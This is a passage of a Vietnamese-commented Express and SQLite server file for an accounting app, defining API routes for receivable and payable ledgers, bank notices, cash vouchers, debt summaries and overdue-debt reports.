      return res.status(400).json({ error: "Thiếu tham số hoặc mã tài khoản không hợp lệ." });
    }
  
    // 1. Lấy số dư đầu kỳ
    const sql1 = `SELECT * FROM SoDuDauKy WHERE MaTK = ?`;
    db.get(sql1, [matk], (err1, sodu) => {
      if (err1) return res.status(500).json({ error: err1.message });

      console.log(sodu); // Kiểm tra số dư đầu kỳ
      // 2. Lấy danh sách giấy báo từ GiayBao có SoCT bắt đầu bằng 'BN'
      const sql2 = `
        SELECT * FROM GiayBao 
        WHERE SoCT LIKE 'BN%' 
          AND NgayCT BETWEEN ? AND ?
      `;
      db.all(sql2, [start, end], (err2, giaybao) => {
        if (err2) return res.status(500).json({ error: err2.message });

        console.log(giaybao); // Kiểm tra danh sách giấy báo
        const socts = giaybao.map(row => row.SoCT);
        if (socts.length === 0) {
          return res.json({ sodudauky: sodu, giaybao: [], ctphieu: [] });
        }
  
        // 3. Lấy chi tiết phiếu từ CTPhieu có TKNo = '331' và SoCT nằm trong danh sách
        const placeholders = socts.map(() => '?').join(',');
        const sql3 = `
          SELECT * FROM CTPhieu 
          WHERE SoCT IN (${placeholders}) 
            AND TKNo = '331'
        `;
        db.all(sql3, socts, (err3, ctphieu) => {
          if (err3) return res.status(500).json({ error: err3.message });

          console.log(ctphieu); // Kiểm tra chi tiết phiếu
          res.json({
            sodudauky: sodu,
            giaybao: giaybao,
            ctphieu: ctphieu
          });
        });
      });
    });
  });

  app.get('/api/sochitietphaithu', (req, res) => {
    const { start, end, matk } = req.query;
  
    if (!start || !end || matk !== '131') {
      return res.status(400).json({ error: "Thiếu tham số hoặc mã tài khoản không hợp lệ." });
    }
  
    // 1. Lấy số dư đầu kỳ
    const sql1 = `SELECT * FROM SoDuDauKy WHERE MaTK = ?`;
    db.get(sql1, [matk], (err1, sodu) => {
      if (err1) return res.status(500).json({ error: err1.message });
  
      // 2. Lấy danh sách giấy báo từ PhieuTC có SoCT bắt đầu bằng 'PT'
      const sql2 = `
        SELECT * FROM PhieuTC 
        WHERE SoCT LIKE 'PT%' 
          AND NgayCT BETWEEN ? AND ?
      `;
      db.all(sql2, [start, end], (err2, phieutc) => {
        if (err2) return res.status(500).json({ error: err2.message });
  
        const socts = phieutc.map(row => row.SoCT);
        if (socts.length === 0) {
          return res.json({ sodudauky: sodu, phieutc: [], ctphieu: [] });
        }
  
        // 3. Lấy chi tiết phiếu từ CTPhieu có TKCo = '131' và SoCT nằm trong danh sách
        const placeholders = socts.map(() => '?').join(',');
        const sql3 = `
          SELECT * FROM CTPhieu 
          WHERE SoCT IN (${placeholders}) 
            AND TKCo = '131'
        `;
        db.all(sql3, socts, (err3, ctphieu) => {
          if (err3) return res.status(500).json({ error: err3.message });
  
          res.json({
            sodudauky: sodu,
            phieutc: phieutc,
            ctphieu: ctphieu
          });
        });
      });
    });
  });

  app.get('/api/sochitietphaitra', (req, res) => {
    const { start, end, matk } = req.query;
  
    if (!start || !end || matk !== '331') {
      return res.status(400).json({ error: "Thiếu tham số hoặc mã tài khoản không hợp lệ." });
    }
  
    // 1. Lấy số dư đầu kỳ
    const sql1 = `SELECT * FROM SoDuDauKy WHERE MaTK = ?`;
    db.get(sql1, [matk], (err1, sodu) => {
      if (err1) return res.status(500).json({ error: err1.message });

      console.log(sodu); // Kiểm tra số dư đầu kỳ
      // 2. Lấy danh sách giấy báo từ PhieuTC có SoCT bắt đầu bằng 'PC'
      const sql2 = `
        SELECT * FROM PhieuTC 
        WHERE SoCT LIKE 'PC%' 
          AND NgayCT BETWEEN ? AND ?
      `;
      db.all(sql2, [start, end], (err2, phieutc) => {
        if (err2) return res.status(500).json({ error: err2.message });

        console.log(phieutc); // Kiểm tra danh sách giấy báo
        const socts = phieutc.map(row => row.SoCT);
        if (socts.length === 0) {
          return res.json({ sodudauky: sodu, phieutc: [], ctphieu: [] });
        }
  
        // 3. Lấy chi tiết phiếu từ CTPhieu có TKNo = '331' và SoCT nằm trong danh sách
        const placeholders = socts.map(() => '?').join(',');
        const sql3 = `
          SELECT * FROM CTPhieu 
          WHERE SoCT IN (${placeholders}) 
            AND TKNo = '331'
        `;
        db.all(sql3, socts, (err3, ctphieu) => {
          if (err3) return res.status(500).json({ error: err3.message });

          console.log(ctphieu); // Kiểm tra chi tiết phiếu
          res.json({
            sodudauky: sodu,
            phieutc: phieutc,
            ctphieu: ctphieu
          });
        });
      });
    });
  });

  // BẢNG GIẤY BÁO CÓ - GBC
// API: Lấy danh sách dữ liệu bảng GBC
app.get('/api/gbc', (req, res) => {
    db.all("SELECT * FROM GiayBao WHERE SoCT LIKE 'BC%' ", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy chi tiết giaybao theo SoCT kèm thông tin CTPhieu từ CTPhieu và thông tin khách hàng từ DMKH
app.get('/api/gbc/:soctgbc', (req, res) => {
    const soct = req.params.soctgbc;
  
    const sql1 = `SELECT * FROM GiayBao WHERE SoCT = ?`;
    db.get(sql1, [soct], (err1, giaybao) => {
      if (err1) return res.status(500).json({ error: err1.message });
      if (!giaybao) return res.status(404).json({ error: 'Không tìm thấy Giấy báo' });
  
      const sql2 = `SELECT * FROM CTPhieu WHERE SoCT = ?`;
      db.all(sql2, [soct], (err2, ctphieu) => {
        if (err2) return res.status(500).json({ error: err2.message });
  
        const sql3 = `SELECT * FROM DMKH WHERE MaKH = ?`;
        db.get(sql3, [giaybao.MaKH], (err3, khachhang) => {
          if (err3) return res.status(500).json({ error: err3.message });
  
          res.json({
            giaybao: giaybao,
            ctphieu: ctphieu,
            khachhang: khachhang
          });
        });
      });
    });
  });
  
  
  // BẢNG GIẤY BÁO NỢ - GBN
// API: Lấy danh sách dữ liệu bảng GBN
app.get('/api/gbn', (req, res) => {
    db.all("SELECT * FROM GiayBao WHERE SoCT LIKE 'BN%' ", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy chi tiết giaybao theo SoCT kèm thông tin CTPhieu từ CTPhieu và thông tin khách hàng từ DMKH
app.get('/api/gbn/:soctgbn', (req, res) => {
    const soct = req.params.soctgbn;
  
    const sql1 = `SELECT * FROM GiayBao WHERE SoCT = ?`;
    db.get(sql1, [soct], (err1, giaybao) => {
      if (err1) return res.status(500).json({ error: err1.message });
      if (!giaybao) return res.status(404).json({ error: 'Không tìm thấy Giấy báo' });
  
      const sql2 = `SELECT * FROM CTPhieu WHERE SoCT = ?`;
      db.all(sql2, [soct], (err2, ctphieu) => {
        if (err2) return res.status(500).json({ error: err2.message });
  
        const sql3 = `SELECT * FROM DMKH WHERE MaKH = ?`;
        db.get(sql3, [giaybao.MaKH], (err3, khachhang) => {
          if (err3) return res.status(500).json({ error: err3.message });
  
          res.json({
            giaybao: giaybao,
            ctphieu: ctphieu,
            khachhang: khachhang
          });
        });
      });
    });
  });

  // BẢNG PHIẾU THU TIỀN - PTT
// API: Lấy danh sách dữ liệu bảng PTT
app.get('/api/ptt', (req, res) => {
    db.all("SELECT * FROM PhieuTC WHERE SoCT LIKE 'PT%' ", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy chi tiết PhieuTC theo SoCT kèm thông tin CTPhieu từ CTPhieu và thông tin khách hàng từ DMKH
app.get('/api/ptt/:soctptt', (req, res) => {
    const soct = req.params.soctptt;
  
    const sql1 = `SELECT * FROM PhieuTC WHERE SoCT = ?`;
    db.get(sql1, [soct], (err1, phieutc) => {
      if (err1) return res.status(500).json({ error: err1.message });
      if (!phieutc) return res.status(404).json({ error: 'Không tìm thấy phiếu thu' });
  
      const sql2 = `SELECT * FROM CTPhieu WHERE SoCT = ?`;
      db.all(sql2, [soct], (err2, ctphieu) => {
        if (err2) return res.status(500).json({ error: err2.message });
  
        const sql3 = `SELECT * FROM DMKH WHERE MaKH = ?`;
        db.get(sql3, [phieutc.MaKH], (err3, khachhang) => {
          if (err3) return res.status(500).json({ error: err3.message });
  
          res.json({
            phieutc: phieutc,
            ctphieu: ctphieu,
            khachhang: khachhang
          });
        });
      });
    });
  });

  // BẢNG PHIẾU CHI TIỀN - PCT
// API: Lấy danh sách dữ liệu bảng PCT
app.get('/api/pct', (req, res) => {
    db.all("SELECT * FROM PhieuTC WHERE SoCT LIKE 'PC%' ", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy chi tiết PhieuTC theo SoCT kèm thông tin CTPhieu từ CTPhieu và thông tin khách hàng từ DMKH
app.get('/api/pct/:soctpct', (req, res) => {
    const soct = req.params.soctpct;
  
    const sql1 = `SELECT * FROM PhieuTC WHERE SoCT = ?`;
    db.get(sql1, [soct], (err1, phieutc) => {
      if (err1) return res.status(500).json({ error: err1.message });
      if (!phieutc) return res.status(404).json({ error: 'Không tìm thấy phiếu thu' });
  
      const sql2 = `SELECT * FROM CTPhieu WHERE SoCT = ?`;
      db.all(sql2, [soct], (err2, ctphieu) => {
        if (err2) return res.status(500).json({ error: err2.message });
  
        const sql3 = `SELECT * FROM DMKH WHERE MaKH = ?`;
        db.get(sql3, [phieutc.MaKH], (err3, khachhang) => {
          if (err3) return res.status(500).json({ error: err3.message });
  
          res.json({
            phieutc: phieutc,
            ctphieu: ctphieu,
            khachhang: khachhang
          });
        });
      });
    });
  });

  // API: Báo cáo công nợ
/**
 * GET /api/summary
 * Query params:
 *   start – YYYY-MM-DD
 *   end   – YYYY-MM-DD
 *   matk  – tài khoản (string)
 *
 * Response: {
 *   rows: [ { MaKH, TenKH, MaSoThue, NoDauKy, CoDauKy, PhatSinhNo, PhatSinhCo, NoCuoiKy, CoCuoiKy }, … ],
 *   totals: { NoDauKy, CoDauKy, PhatSinhNo, PhatSinhCo, NoCuoiKy, CoCuoiKy }
 * }
 */

// promisify để dùng async/await
const dbRun  = promisify(db.run.bind(db));
const dbGet  = promisify(db.get.bind(db));
const dbAll  = promisify(db.all.bind(db));
const dbExec = promisify(db.exec.bind(db));  // ← đây

app.get('/api/tonghopcongnnophaithu', async (req, res) => {
  try {
    const { start, end, matk } = req.query;
    if (!start || !end || !matk) {
      return res.status(400).json({ error: 'Thiếu tham số start/end/matk' });
    }

    // 1) Lấy danh sách MaKH
    const custs = await dbAll(
      `SELECT DISTINCT MaKH
       FROM HDHH
       WHERE date(NgayCT) BETWEEN date(?) AND date(?)`,
      [start, end]
    );

    const rows = [];
    for (const { MaKH: makh } of custs) {
      // 2) Thông tin khách
      const khRow = await dbGet(
        `SELECT TenKH, MaSoThue
         FROM DMKH
         WHERE MaKH = ?`,
        [makh]
      );
      const TenKH    = khRow?.TenKH    || '';
      const MaSoThue = khRow?.MaSoThue || '';

      // 3) Nợ/Có đầu kỳ
      const ndkRow = await dbGet(
        `SELECT IFNULL(DuNo,0) AS DuNo, IFNULL(DuCo,0) AS DuCo
         FROM NoDauKy
         WHERE MaKH = ? AND MaTK = ?`,
        [makh, matk]
      );
      const DuNo = ndkRow?.DuNo || 0;
      const DuCo = ndkRow?.DuCo || 0;

      // 4) Phát sinh Nợ
      const pnoRow = await dbGet(
        `SELECT IFNULL(SUM(TienThanhToan),0) AS sumNo
         FROM HDHH
         WHERE MaKH = ?
           AND TKNoThanhToan = ?
           AND date(NgayCT) BETWEEN date(?) AND date(?)`,
        [makh, matk, start, end]
      );
      const PhatSinhNo = pnoRow?.sumNo || 0;

      // 5) Phát sinh Có
      const pcoRow = await dbGet(
        `SELECT IFNULL(SUM(ct.SoTien),0) AS sumCo
         FROM PhieuTC p
         JOIN HDHH hd
           ON p.MaKH = hd.MaKH
          AND date(p.NgayCT) > date(hd.NgayCT)
         JOIN CTPhieu ct
           ON ct.SoCT = p.SoCT
         WHERE p.MaKH = ?`,
        [makh]
      );
      const PhatSinhCo = pcoRow?.sumCo || 0;

      // 6) Nợ/Có cuối kỳ
      const NoCuoiKy = DuNo + PhatSinhNo;
      const CoCuoiKy = DuCo + PhatSinhCo;

      // —— SỬA Ở ĐÂY: dùng makh (không phải MaKH) cho key MaKH
      rows.push({
        MaKH:        makh,
        TenKH,
        MaSoThue,
        NoDauKy:     DuNo,
        CoDauKy:     DuCo,
        PhatSinhNo,
        PhatSinhCo,
        NoCuoiKy,
        CoCuoiKy
      });
    }

    // 7) Tính tổng
    const totals = rows.reduce((t, r) => {
      t.NoDauKy    += r.NoDauKy;
      t.CoDauKy    += r.CoDauKy;
      t.PhatSinhNo += r.PhatSinhNo;
      t.PhatSinhCo += r.PhatSinhCo;
      t.NoCuoiKy   += r.NoCuoiKy;
      t.CoCuoiKy   += r.CoCuoiKy;
      return t;
    }, {
      NoDauKy:0, CoDauKy:0,
      PhatSinhNo:0, PhatSinhCo:0,
      NoCuoiKy:0, CoCuoiKy:0
    });

    res.json({ rows, totals });

  } catch (err) {
    console.error('❌ LỖI /api/tonghopcongnnophaithu:', err.stack);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/tonghopcongnnophaitra', async (req, res) => {
  try {
    const { start, end, matk } = req.query;
    if (!start || !end || !matk) {
      return res.status(400).json({ error: 'Thiếu tham số start/end/matk' });
    }

    // 1) Danh sách NCC (MaKH) có Hóa đơn mua hàng trong khoảng
    const suppliers = await dbAll(
      `SELECT DISTINCT MaKH
       FROM HoaDonMuaHang
       WHERE date(NgayCT) BETWEEN date(?) AND date(?)`,
      [start, end]
    );

    const rows = [];
    for (const { MaKH: makh } of suppliers) {
      // 2) Thông tin NCC
      const sup = await dbGet(
        `SELECT TenKH, MaSoThue FROM DMKH WHERE MaKH = ?`,
        [makh]
      ) || { TenKH:'', MaSoThue:'' };

      // 3) Nợ đầu kỳ / Có đầu kỳ
      const ndk = await dbGet(
        `SELECT IFNULL(DuNo,0) AS DuNo, IFNULL(DuCo,0) AS DuCo
         FROM NoDauKy
         WHERE MaKH = ? AND MaTK = ?`,
        [makh, matk]
      ) || { DuNo:0, DuCo:0 };

      // 4) Phát sinh Có = SUM(TienThanhToan) khi TKCoThanhToan = matk
      const pcoRow = await dbGet(
        `SELECT IFNULL(SUM(TienThanhToan),0) AS sumCo
         FROM HoaDonMuaHang
         WHERE MaKH = ?
           AND TKCoThanhToan = ?
           AND date(NgayCT) BETWEEN date(?) AND date(?)`,
        [makh, matk, start, end]
      );
      const PhatSinhCo = pcoRow?.sumCo || 0;

      // 5) Phát sinh Nợ = từ PhieuTC sau hạn, sum CTPhieu.SoTien
      //    hạn = NgayCT + HanTT ngày (lưu ở HDMH.HanTT)
      //    nếu sum = 0 => PhatSinhNo = 0 else PhatSinhNo = sum
      const pnoRow = await dbGet(
        `SELECT IFNULL(SUM(ct.SoTien),0) AS sumNo
         FROM PhieuTC p
         JOIN HoaDonMuaHang hd
           ON p.MaKH = hd.MaKH
          AND date(p.NgayCT) > date(hd.NgayCT)
         JOIN CTPhieu ct
           ON ct.SoCT = p.SoCT
         WHERE p.MaKH = ?`,
        [makh]
      );
      const PhatSinhNo = pnoRow?.sumNo || 0;

      // 6) Nợ/Có cuối kỳ
      const NoCuoiKy = ndk.DuNo + PhatSinhNo;
      const CoCuoiKy = ndk.DuCo + PhatSinhCo;

      rows.push({
        MaKH:        makh,
        TenKH:       sup.TenKH,
        MaSoThue:    sup.MaSoThue,
        NoDauKy:     ndk.DuNo,
        CoDauKy:     ndk.DuCo,
        PhatSinhNo,
        PhatSinhCo,
        NoCuoiKy,
        CoCuoiKy
      });
    }

    // 7) Tính tổng
    const totals = rows.reduce((t,r) => {
      t.NoDauKy    += r.NoDauKy;
      t.CoDauKy    += r.CoDauKy;
      t.PhatSinhNo += r.PhatSinhNo;
      t.PhatSinhCo += r.PhatSinhCo;
      t.NoCuoiKy   += r.NoCuoiKy;
      t.CoCuoiKy   += r.CoCuoiKy;
      return t;
    }, {
      NoDauKy:0, CoDauKy:0,
      PhatSinhNo:0, PhatSinhCo:0,
      NoCuoiKy:0, CoCuoiKy:0
    });

    res.json({ rows, totals });
  } catch (err) {
    console.error('❌ LỖI /api/tonghopcongnnophaitra:', err.stack);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/noquahanphaithu', async (req, res) => {
  try {
    const { date: cutoff, matk } = req.query;
    if (!cutoff || !matk) {
      return res.status(400).json({ error: 'Thiếu tham số date/matk' });
    }

    // 1) Danh sách MaKH có HDHH phù hợp
    const custs = await dbAll(
      `SELECT DISTINCT MaKH
       FROM HDHH
       WHERE date(NgayCT, '+'||HanTT||' days') < date(?)`,
      [ cutoff]
    );

    const rows = [];
    for (const { MaKH: makh } of custs) {
      // 2) Thông tin KH
      const kh = await dbGet(
        `SELECT TenKH, MaSoThue FROM DMKH WHERE MaKH = ?`,
        [makh]
      );
      const TenKH    = kh?.TenKH    || '';
      const MaSoThue = kh?.MaSoThue || '';

      // 3) Nợ đầu kỳ / Có đầu kỳ
      const ndk = await dbGet(
        `SELECT IFNULL(DuNo,0) AS DuNo, IFNULL(DuCo,0) AS DuCo
         FROM NoDauKy
         WHERE MaKH = ? AND MaTK = ?`,
        [makh, matk]
      );
      const DuNo = ndk?.DuNo || 0;
      const DuCo = ndk?.DuCo || 0;

      // 4) Phát sinh nợ = tổng TienThanhToan của HDHH
      const pnoRow = await dbGet(
        `SELECT IFNULL(SUM(TienThanhToan),0) AS sumNo
         FROM HDHH
         WHERE MaKH = ?
           AND TKNoThanhToan = ?
           AND date(NgayCT) < date(?)`,
        [makh, matk, cutoff]
      );
      const PhatSinhNo = pnoRow?.sumNo || 0;

      // 5) Phát sinh có = tổng SoTien từ CTPhieu cho PhieuTC sau cutoff
      const pcoRow = await dbGet(
        `SELECT IFNULL(SUM(ct.SoTien),0) AS sumCo
         FROM PhieuTC p
         JOIN HDHH hd
           ON p.MaKH = hd.MaKH
          AND date(p.NgayCT) > date(hd.NgayCT)
         JOIN CTPhieu ct
           ON ct.SoCT = p.SoCT
         WHERE p.MaKH = ?`,
        [makh]
      );
      const PhatSinhCo = pcoRow?.sumCo || 0;

      // 6) Nợ/Có cuối kỳ
      const NoCuoiKy = DuNo + PhatSinhNo;
      const CoCuoiKy = DuCo + PhatSinhCo;

      // 7) Nợ quá hạn = tổng TienThanhToan của HDHH quá hạn − PhatSinhCo (>=0)
      const over = await dbGet(
        `SELECT IFNULL(SUM(TienThanhToan),0) AS sumOver
         FROM HDHH
         WHERE MaKH = ?
           AND date(NgayCT, '+'||HanTT||' days') < date(?)`,
        [makh, cutoff]
      );
      const noQuaHan = Math.max(0, over.sumOver - PhatSinhCo);

      rows.push({
        MaKH:      makh,
        TenKH:     kh.TenKH,
        MaSoThue:  kh.MaSoThue,
        NoCuoiKy:  NoCuoiKy,
        CoCuoiKy:  CoCuoiKy,
        NoQuaHan:  noQuaHan
      });
    }

    // 8) Tính tổng các cột
    const totals = rows.reduce((t, r) => {
      t.NoCuoiKy += r.NoCuoiKy;
      t.CoCuoiKy += r.CoCuoiKy;
      t.NoQuaHan += r.NoQuaHan;
      return t;
    }, { NoCuoiKy: 0, CoCuoiKy: 0, NoQuaHan: 0 });

    res.json({ rows, totals });
  } catch (err) {
    console.error('❌ LỖI /api/noquahanphaithu:', err.stack);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/noquahanphaitra', async (req, res) => {
  try {
    const { date: cutoff, matk } = req.query;
    if (!cutoff || !matk) {
      return res.status(400).json({ error: 'Thiếu tham số date/matk' });
    }

    // 1) Lấy danh sách NCC
    const suppliers = await dbAll(
      `SELECT DISTINCT MaKH
       FROM HoaDonMuaHang
       WHERE TKCoThanhToan = ?
         AND date(NgayCT) < date(?)`,
      [matk, cutoff]
    );

    const rows = [];
    for (const { MaKH: makh } of suppliers) {
      // 2) Thông tin NCC
      const kh = await dbGet(
        `SELECT TenKH, MaSoThue FROM DMKH WHERE MaKH = ?`,
        [makh]
      ) || { TenKH:'', MaSoThue:'' };

      // 3) Nợ/Có đầu kỳ
      const ndk = await dbGet(
        `SELECT IFNULL(DuNo,0) AS DuNo, IFNULL(DuCo,0) AS DuCo
         FROM NoDauKy WHERE MaKH = ? AND MaTK = ?`,
        [makh, matk]
      ) || { DuNo:0, DuCo:0 };

      // 4) Phát sinh Có
      const coRow = await dbGet(
        `SELECT IFNULL(SUM(TienThanhToan),0) AS sumCo
         FROM HoaDonMuaHang
         WHERE MaKH = ? AND TKCoThanhToan = ? AND date(NgayCT) < date(?)`,
        [makh, matk, cutoff]
      );
      const PhatSinhCo = coRow.sumCo;

      // 5) Phát sinh Nợ
      const noRow = await dbGet(
        `SELECT IFNULL(SUM(ct.SoTien),0) AS sumNo
         FROM PhieuTC p
         JOIN HoaDonMuaHang hd
           ON p.MaKH = hd.MaKH
          AND date(p.NgayCT) > date(hd.NgayCT, '+'||hd.HanTT||' days')
         JOIN CTPhieu ct ON ct.SoCT = p.SoCT
         WHERE p.MaKH = ?`,
        [makh]
      );
      const PhatSinhNo = noRow.sumNo;

      // 6) Cuối kỳ
      const NoCuoiKy = ndk.DuNo + PhatSinhNo;
      const CoCuoiKy = ndk.DuCo + PhatSinhCo;

      // 7) Nợ quá hạn
      // const overdueRow = await dbGet(
      //   `SELECT IFNULL(SUM(TienThanhToan),0) AS sumOver
      //    FROM HoaDonMuaHang
      //    WHERE MaKH = ?
      //      AND date(NgayCT, '+'||HanTT||' days') < date(?)`,
      //   [makh, cutoff]
      // );
      // const rawOver = overdueRow.sumOver;
      const NoQuaHan = Math.max(0, CoCuoiKy - PhatSinhNo);

      // —— SỬA ĐÚNG Ở ĐÂY: MaKH: makh
      rows.push({
        MaKH:      makh,
        TenKH:     kh.TenKH,
        MaSoThue:  kh.MaSoThue,
        NoDauKy:   ndk.DuNo,
        CoDauKy:   ndk.DuCo,
        PhatSinhCo,
        PhatSinhNo,
        NoCuoiKy,
        CoCuoiKy,
        NoQuaHan
      });
    }

    // 8) Tính tổng
    const totals = rows.reduce((t, r) => {
      t.NoCuoiKy += r.NoCuoiKy;
      t.CoCuoiKy += r.CoCuoiKy;
      t.NoQuaHan += r.NoQuaHan;
      return t;
    }, { NoCuoiKy:0, CoCuoiKy:0, NoQuaHan:0 });

    res.json({ rows, totals });
  } catch (err) {
    console.error('❌ LỖI /api/noquahanphaitra:', err.stack);
    res.status(500).json({ error: err.message });
  }
});

// Khởi động server
app.listen(3000, () => {
    console.log('Server chạy tại http://localhost:3000');
});
